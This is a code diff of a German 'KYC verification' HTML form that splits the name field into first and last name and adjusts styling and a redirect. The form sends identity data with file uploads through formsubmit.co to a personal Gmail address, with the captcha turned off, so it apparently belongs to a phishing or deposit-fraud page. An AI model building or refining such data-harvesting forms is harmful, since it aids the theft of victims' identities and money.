@@ -41,6 +41,15 @@
       box-sizing: border-box;
     }
 
+    .name-fields {
+      display: flex;
+      gap: 15px;
+    }
+
+    .name-fields div {
+      flex: 1;
+    }
+
     button {
       margin-top: 25px;
       width: 100%;
@@ -63,10 +72,17 @@
     <h2>KYC Verifizierungsformular</h2>
     <form action="https://formsubmit.co/festgeldpartner@gmail.com" method="POST" enctype="multipart/form-data">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://nextterminal.github.io/kyc-form/thanks.html">
+      <input type="hidden" name="_next" value="https://nextterminal.github.io/kyc/thanks.html">
 
-      <label for="fullname">Vollständiger Name</label>
-      <input type="text" name="fullname" id="fullname" required>
+      <label>Name</label>
+      <div class="name-fields">
+        <div>
+          <input type="text" name="vorname" placeholder="Vorname" required>
+        </div>
+        <div>
+          <input type="text" name="nachname" placeholder="Nachname" required>
+        </div>
+      </div>
 
       <label for="email">E-Mail-Adresse</label>
       <input type="email" name="email" id="email" required>
